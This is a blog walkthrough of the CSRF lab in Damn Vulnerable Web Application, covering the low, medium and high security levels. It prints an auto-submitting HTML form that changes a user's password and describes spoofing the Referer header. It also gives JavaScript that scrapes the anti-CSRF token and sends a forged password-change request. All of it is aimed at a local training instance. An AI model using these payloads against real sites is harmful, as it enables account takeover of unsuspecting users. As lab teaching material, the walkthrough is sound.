---
layout: post
title:  "Damn Vulnerable Web Application - Part 3 / 12 CSRF"
date:   2024-04-29 20:00
image:  /images/dvwa-walkthrough/DVWA.jpg
tags:   [csrf]
categories: [DVWA]
---

# Cross Site Request Forgery (CSRF)
>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.
<br/>
<br/>
<b>Reference:</b>
<a href="https://owasp.org/www-community/attacks/csrf">OWASP</a>

### Security Level: `Low`

![DVWA CSRF Initial page](/images//dvwa-walkthrough/csrf/csrf-initial.png)


1. Reset the password and capture the request in Burp Suite. We can use the Burp Suite CSRF PoC generator to generate a PoC or we can use the below html code to test the form.

```
<html>
  <body>
    <form action='http://localhost:4280/vulnerabilities/csrf/'>
      <input type="hidden" name="password&#95;new" value="password" />
      <input type="hidden" name="password&#95;conf" value="password" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Preview of above html form:
![DVWA CSRF Malicious page](/images//dvwa-walkthrough/csrf/csrf-malicious-form.png)

#### Source Code:

![DVWA CSRF Low](/images/dvwa-walkthrough/csrf/csrf-low-source-code.png)
<br/>

### Security Level: `Medium`

When trying the same approach for the `Low` CSRF lab we get the following error:

![DVWA CSRF Medium Error](/images//dvwa-walkthrough/csrf/csrf-medium-error.png)

`Warning: Undefined array key "HTTP_REFERER" in /var/www/html/vulnerabilities/csrf/source/medium.php on line 5` indicates that there is a missing header value (`HTTP_REFERER`). We'll update the referer header to have the same path and parameters as our request.

![DVWA CSRF Medium Solution](/images//dvwa-walkthrough/csrf/csrf-medium-solution.png)

#### Source Code:

![DVWA CSRF Medium](/images/dvwa-walkthrough/csrf/csrf-medium-source-code.png)
<br/>

### Security Level: `High`

Inspecting the form we notice that the High security level form has a hidden input for user_token. This user_token is refreshed with every new request made to the server. [Read more on CSRF tokens ](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern).

![DVWA CSRF High Solution](/images//dvwa-walkthrough/csrf/csrf-high-form.png)

To bypass this we'll in our malicious form we'll have to request a new CSRF token from the server and use that token to send our request.

The below javascript code requests a new CSRF token by sending a GET request to the page. We'll utilize regex `/[a-f0-9]{32}/g` to extract the user token from the response received. 
We then use the extracted user_token and add it to the malicious update request's query paramters.

```
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Malicious File</title>
    
</head>
<body onload="maliciousFunction()">
    <p>;)</p>
    <script>
        function maliciousFunction(){
            const request = new XMLHttpRequest();
            
            request.open("GET", "http://localhost:4280/vulnerabilities/csrf/");
            request.onreadystatechange = () => {
            if (request.readyState === request.DONE && request.status === 200) {

                var response = request.responseText;
                var token = /[a-f0-9]{32}/g.exec(response)[0]
                var second_request = new XMLHttpRequest();
                second_request.open("GET", "http://localhost:4280/vulnerabilities/csrf/?password_new=zwarts&password_conf=zwarts&Change=Change&user_token="+token);
                second_request.send()

            }};

            request.send()
        }
        </script>
</body>
</html> 
```

`WIP - Add steps to upload above form to execute on visit, can't execute form from 3rd party because cors isn't enabled.`